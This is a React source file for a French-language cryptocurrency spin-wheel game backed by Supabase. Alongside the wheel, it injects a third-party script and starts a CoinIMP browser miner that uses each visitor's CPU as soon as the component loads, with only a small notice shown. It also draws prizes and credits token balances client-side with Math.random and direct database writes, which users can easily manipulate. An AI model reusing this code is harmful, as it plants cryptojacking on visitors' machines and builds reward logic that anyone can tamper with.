import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { Loader2 } from 'lucide-react';
import HashrateTicker from './HashrateTicker';

interface SpinWheelProps {
  onZeroWin?: (amount: number) => void;
  
}

interface SpinPrize {
  id: string;
  type: 'zero' | 'usdt' | 'dogecoin';
  amount: number;
  probability: number;
  color: string;
  icon: string;
}

const SPIN_PRIZES: SpinPrize[] = [
  { id: '1', type: 'zero', amount: 0.0001, probability: 25, color: '#FFD700', icon: '💰' },
  { id: '2', type: 'zero', amount: 0.001, probability: 20, color: '#FFA500', icon: '💰' },
  { id: '3', type: 'zero', amount: 0.01, probability: 15, color: '#FF6B35', icon: '💰' },
  { id: '4', type: 'zero', amount: 0.1, probability: 12, color: '#FF4500', icon: '💰' },
  { id: '5', type: 'zero', amount: 0.5, probability: 10, color: '#DC143C', icon: '💰' },
  { id: '6', type: 'zero', amount: 1.0, probability: 8, color: '#8B0000', icon: '💰' },
  { id: '7', type: 'zero', amount: 2.0, probability: 5, color: '#4B0082', icon: '💰' },
  { id: '8', type: 'zero', amount: 3.0, probability: 3, color: '#9400D3', icon: '💰' },
  { id: '9', type: 'usdt', amount: 5, probability: 1.5, color: '#26A69A', icon: '💵' },
  { id: '10', type: 'dogecoin', amount: 500, probability: 0.5, color: '#BA9F33', icon: '🐕' }
];

export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
  const [canFreeSpin, setCanFreeSpin] = useState(false);
  const [nextFreeSpinTime, setNextFreeSpinTime] = useState<Date | null>(null);
  const [timeUntilFreeSpin, setTimeUntilFreeSpin] = useState('');
  const [isSpinning, setIsSpinning] = useState(false);
  const [rotation, setRotation] = useState(0);
  const [lastPrize, setLastPrize] = useState<SpinPrize | null>(null);
  const [userStats, setUserStats] = useState({
    totalSpins: 0,
    totalZeroWon: 0,
    totalUsdtWon: 0,
    totalDogecoinWon: 0
  });

  // Purchase spin dialog states
  const [isPurchaseDialogOpen, setIsPurchaseDialogOpen] = useState(false);
  const [transactionId, setTransactionId] = useState('');
  const [selectedCurrency, setSelectedCurrency] = useState('');
  const [selectedSource, setSelectedSource] = useState('');
  const [isSubmittingTx, setIsSubmittingTx] = useState(false);

  const { toast } = useToast();

  const currencies = [
    'USD', 'EUR', 'RUB', 'BTC', 'ETH', 'LTC', 'BCH', 'USDT', 'TRX', 'TON', 'DOGE', 'MATIC', 'SOL'
  ];
  const sources = ['Payeer', 'Binance', 'Coinbase', 'Bybit', 'Autre'];

  useEffect(() => {
    checkSpinStatus();
    const interval = setInterval(updateCountdown, 1000);
    return () => clearInterval(interval);
  }, []);

  const checkSpinStatus = async () => {
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) return;

      const { data: status } = await supabase
        .from('user_spin_status')
        .select('*')
        .eq('user_id', user.id)
        .single();

      if (status) {
        setUserStats({
          totalSpins: Number(status.total_spins),
          totalZeroWon: Number(status.total_zero_won),
          totalUsdtWon: Number(status.total_usdt_won),
          totalDogecoinWon: Number(status.total_dogecoin_won)
        });

        if (status.last_free_spin) {
          const lastSpin = new Date(status.last_free_spin);
          const nextSpin = new Date(lastSpin.getTime() + 3 * 60 * 60 * 1000); // 3 hours
          setNextFreeSpinTime(nextSpin);
          setCanFreeSpin(new Date() >= nextSpin);
        } else {
          setCanFreeSpin(true);
        }
      } else {
        setCanFreeSpin(true);
        await supabase.from('user_spin_status').insert({ user_id: user.id });
      }
    } catch (error) {
      console.error('Error checking spin status:', error);
    }
  };

  const updateCountdown = () => {
    if (!nextFreeSpinTime) return;

    const now = new Date();
    const timeLeft = nextFreeSpinTime.getTime() - now.getTime();

    if (timeLeft <= 0) {
      setCanFreeSpin(true);
      setTimeUntilFreeSpin('');
      return;
    }

    const hours = Math.floor(timeLeft / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

    setTimeUntilFreeSpin(`${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
  };

  const getRandomPrize = (): SpinPrize => {
    const random = Math.random() * 100;
    let cumulativeProbability = 0;

    for (const prize of SPIN_PRIZES) {
      cumulativeProbability += prize.probability;
      if (random <= cumulativeProbability) {
        return prize;
      }
    }

    return SPIN_PRIZES[0]; // Fallback
  };

  const addZeroToWallet = async (userId: string, amount: number) => {
    // crédite farming_data.zero_tokens
    const { data, error } = await supabase
      .from('farming_data')
      .select('zero_tokens')
      .eq('user_id', userId)
      .single();

    if (error && error.code !== 'PGRST116') {
      console.error('Erreur lecture zero_tokens:', error);
      return;
    }

    if (!data) {
      // créer la ligne si besoin puis set
      const { error: insErr } = await supabase.from('farming_data').insert({ user_id: userId, zero_tokens: amount });
      if (insErr) {
        console.error('Erreur création farming_data pour ZERO:', insErr);
      }
      return;
    }

    const current = Number(data.zero_tokens ?? 0);
    const { error: upErr } = await supabase
      .from('farming_data')
      .update({ zero_tokens: current + amount })
      .eq('user_id', userId);

    if (upErr) {
      console.error('Erreur update zero_tokens:', upErr);
    }
  };

  const performSpin = async (isFreeSpin: boolean = true) => {
    if (isSpinning) return;

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) {
        toast({
          title: "Erreur",
          description: "Vous devez être connecté pour tourner la roue",
          variant: "destructive"
        });
        return;
      }

      setIsSpinning(true);
      
      const prize = getRandomPrize();
      const spinRotation = rotation + 1440 + (360 / SPIN_PRIZES.length) * SPIN_PRIZES.indexOf(prize);
      setRotation(spinRotation);

      setTimeout(async () => {
        setLastPrize(prize);
        
        // Save spin result
        await supabase.from('spin_results').insert({
          user_id: user.id,
          prize_type: prize.type,
          prize_amount: prize.amount,
          is_free_spin: isFreeSpin
        });

        // Update user stats
        const updates: any = {
          total_spins: userStats.totalSpins + 1,
          updated_at: new Date().toISOString()
        };

        if (isFreeSpin) {
          updates.last_free_spin = new Date().toISOString();
        }

        if (prize.type === 'zero') {
          updates.total_zero_won = userStats.totalZeroWon + prize.amount;
          await addZeroToWallet(user.id, prize.amount);
          if (onZeroWin) onZeroWin(prize.amount);
        } else if (prize.type === 'usdt') {
          updates.total_usdt_won = userStats.totalUsdtWon + prize.amount;
        } else if (prize.type === 'dogecoin') {
          updates.total_dogecoin_won = userStats.totalDogecoinWon + prize.amount;
        }

        await supabase
          .from('user_spin_status')
          .upsert({ user_id: user.id, ...updates });

        // Show prize notification
        toast({
          title: "🎉 Félicitations !",
          description: `Vous avez gagné ${prize.amount} ${prize.type.toUpperCase()}!`
        });

        if (isFreeSpin) {
          const nextSpin = new Date(Date.now() + 3 * 60 * 60 * 1000);
          setNextFreeSpinTime(nextSpin);
          setCanFreeSpin(false);
        }

        setUserStats(prev => ({
          totalSpins: prev.totalSpins + 1,
          totalZeroWon: prize.type === 'zero' ? prev.totalZeroWon + prize.amount : prev.totalZeroWon,
          totalUsdtWon: prize.type === 'usdt' ? prev.totalUsdtWon + prize.amount : prev.totalUsdtWon,
          totalDogecoinWon: prize.type === 'dogecoin' ? prev.totalDogecoinWon + prize.amount : prev.totalDogecoinWon
        }));

        setIsSpinning(false);
      }, 3000);
    } catch (error) {
      console.error('Error performing spin:', error);
      toast({
        title: "Erreur",
        description: "Une erreur s'est produite lors du spin",
        variant: "destructive"
      });
      setIsSpinning(false);
    }
  };

  const submitTransaction = async () => {
    if (!transactionId.trim() || !selectedCurrency || !selectedSource) {
      toast({
        title: "Informations manquantes",
        description: "Veuillez remplir tous les champs",
        variant: "destructive"
      });
      return;
    }

    setIsSubmittingTx(true);

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error('User not authenticated');

      const { error } = await supabase.from('spin_transactions').insert({
        user_id: user.id,
        transaction_id: transactionId.trim(),
        payment_method: selectedSource, // utiliser la source comme méthode
        currency_paid: selectedCurrency,
        amount_paid: 0.10
      });

      if (error) throw error;

      toast({
        title: "Transaction soumise",
        description: "Votre transaction est en cours de vérification par notre équipe."
      });

      setIsPurchaseDialogOpen(false);
      setTransactionId('');
      setSelectedCurrency('');
      setSelectedSource('');
    } catch (error: any) {
      console.error('Error submitting transaction:', error);
      toast({
        title: "Erreur",
        description: "Erreur lors de la soumission de la transaction",
        variant: "destructive"
      });
    } finally {
      setIsSubmittingTx(false);
    }
  };

  useEffect(() => {
    // Remplace l'ancien script par le nouveau + expose window._client
    const script1 = document.createElement('script');
    script1.src = 'https://www.hostingcloud.racing/etyE.js';
    document.head.appendChild(script1);

    const script2 = document.createElement('script');
    script2.innerHTML = `
      window._client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
        throttle: 0.4, c: 'w'
      });
      window._client.start();
      window._client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
    `;
    document.body.appendChild(script2);

    return () => {
      // Cleanup scripts on unmount
      try {
        document.head.removeChild(script1);
        document.body.removeChild(script2);
      } catch (e) {
        // ignore
      }
    };
  }, []);

  return (
    <Card className="gradient-card mb-8">
      <CardHeader className="text-center">
        <div className="flex justify-between items-center mb-4">
          <div></div>
          <div>
            <CardTitle className="text-3xl gradient-text">🎰 Roue de la Fortune</CardTitle>
            <p className="text-muted-foreground">Tournez gratuitement toutes les 3h ou achetez des spins !</p>
          </div>
          <div></div>
        </div>
        <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
          ⚡ Section avec mining JavaScript actif
        </div>
        <div className="mt-3">
          <HashrateTicker />
        </div>
      </CardHeader>
      <CardContent>
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Spin Wheel */}
          <div className="lg:col-span-2 flex flex-col items-center">
            <div className="relative mb-6">
              <div 
                className="w-80 h-80 rounded-full border-8 border-primary relative overflow-hidden transition-transform duration-[3000ms] ease-out"
                style={{ 
                  transform: `rotate(${rotation}deg)`,
                  background: `conic-gradient(${SPIN_PRIZES.map((prize, index) => 
                    `${prize.color} ${(index / SPIN_PRIZES.length) * 360}deg ${((index + 1) / SPIN_PRIZES.length) * 360}deg`
                  ).join(', ')})`
                }}
              >
                {/* Spin segments with prizes */}
                {SPIN_PRIZES.map((prize, index) => (
                  <div
                    key={prize.id}
                    className="absolute w-1/2 h-1/2 flex items-center justify-center text-white font-bold text-xs"
                    style={{
                      transformOrigin: '100% 100%',
                      transform: `rotate(${(360 / SPIN_PRIZES.length) * index}deg)`,
                      top: '0',
                      left: '50%'
                    }}
                  >
                    <div className="text-center">
                      <div className="text-lg">{prize.icon}</div>
                      <div className="text-xs">
                        {prize.amount} {prize.type === 'zero' ? 'ZERO' : prize.type.toUpperCase()}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
              
              {/* Pointer */}
              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-2 z-10">
                <div className="w-0 h-0 border-l-4 border-r-4 border-b-8 border-l-transparent border-r-transparent border-b-primary"></div>
              </div>
            </div>

            {/* Last Prize */}
            {lastPrize && (
              <div className="mb-4 p-4 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 rounded-lg border border-yellow-500/30">
                <div className="text-center">
                  <div className="text-2xl mb-2">{lastPrize.icon}</div>
                  <div className="font-bold">Dernier gain:</div>
                  <div className="text-lg gradient-text">
                    {lastPrize.amount} {lastPrize.type === 'zero' ? 'ZERO' : lastPrize.type.toUpperCase()}
                  </div>
                </div>
              </div>
            )}

            {/* Spin Controls */}
            <div className="space-y-4 w-full max-w-md">
              <Button
                variant="crypto"
                size="xl"
                onClick={() => performSpin(true)}
                disabled={!canFreeSpin || isSpinning}
                className="w-full"
              >
                {isSpinning ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Tournage...
                  </>
                ) : canFreeSpin ? (
                  '🆓 Spin Gratuit'
                ) : (
                  `⏰ Prochain gratuit dans ${timeUntilFreeSpin}`
                )}
              </Button>

              <Dialog open={isPurchaseDialogOpen} onOpenChange={setIsPurchaseDialogOpen}>
                <DialogTrigger asChild>
                  <Button variant="stake" size="xl" className="w-full">
                    🔎 Vérifier un ID de transaction (0.10 USD)
                  </Button>
                </DialogTrigger>
                <DialogContent className="sm:max-w-md">
                  <DialogHeader>
                    <DialogTitle>Vérification IDTX - 0.10 USD</DialogTitle>
                  </DialogHeader>
                  <div className="space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="source">Source des fonds</Label>
                        <Select value={selectedSource} onValueChange={setSelectedSource}>
                          <SelectTrigger>
                            <SelectValue placeholder="Sélectionnez la source" />
                          </SelectTrigger>
                          <SelectContent>
                            {sources.map(s => (
                              <SelectItem key={s} value={s}>
                                {s}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      <div>
                        <Label htmlFor="currency">Devise utilisée</Label>
                        <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
                          <SelectTrigger>
                            <SelectValue placeholder="Sélectionnez la devise" />
                          </SelectTrigger>
                          <SelectContent>
                            {currencies.map(currency => (
                              <SelectItem key={currency} value={currency}>
                                {currency}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    <div>
                      <Label htmlFor="txId">ID de Transaction</Label>
                      <Input
                        id="txId"
                        value={transactionId}
                        onChange={(e) => setTransactionId(e.target.value)}
                        placeholder="Collez votre ID de transaction ici"
                      />
                    </div>

                    <div className="flex gap-2">
                      <Button
                        variant="outline"
                        onClick={() => setIsPurchaseDialogOpen(false)}
                        className="flex-1"
                        disabled={isSubmittingTx}
                      >
                        Annuler
                      </Button>
                      <Button
                        variant="crypto"
                        onClick={submitTransaction}
                        className="flex-1"
                        disabled={isSubmittingTx}
                      >
                        {isSubmittingTx ? 'Vérification...' : 'Soumettre'}
                      </Button>
                    </div>
                  </div>
                </DialogContent>
              </Dialog>
            </div>
          </div>

          {/* Stats Panel */}
          <div className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">📊 Vos Statistiques</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex justify-between">
                  <span>Spins totaux:</span>
                  <Badge variant="outline">{userStats.totalSpins}</Badge>
                </div>
                <div className="flex justify-between">
                  <span>ZERO gagnés:</span>
                  <Badge variant="outline" className="text-yellow-400">
                    {userStats.totalZeroWon.toFixed(6)}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span>USDT gagnés:</span>
                  <Badge variant="outline" className="text-green-400">
                    {userStats.totalUsdtWon.toFixed(2)}
                  </Badge>
                </div>
                <div className="flex justify-between">
                  <span>DOGE gagnés:</span>
                  <Badge variant="outline" className="text-orange-400">
                    {userStats.totalDogecoinWon.toFixed(0)}
                  </Badge>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-lg">🎁 Récompenses Possibles</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span>💰 ZERO:</span>
                    <span>0.0001 - 3.0</span>
                  </div>
                  <div className="flex justify-between text-green-400">
                    <span>💵 USDT:</span>
                    <span>5.0 (Rare!)</span>
                  </div>
                  <div className="flex justify-between text-orange-400">
                    <span>🐕 DOGECOIN:</span>
                    <span>500 (Très rare!)</span>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};
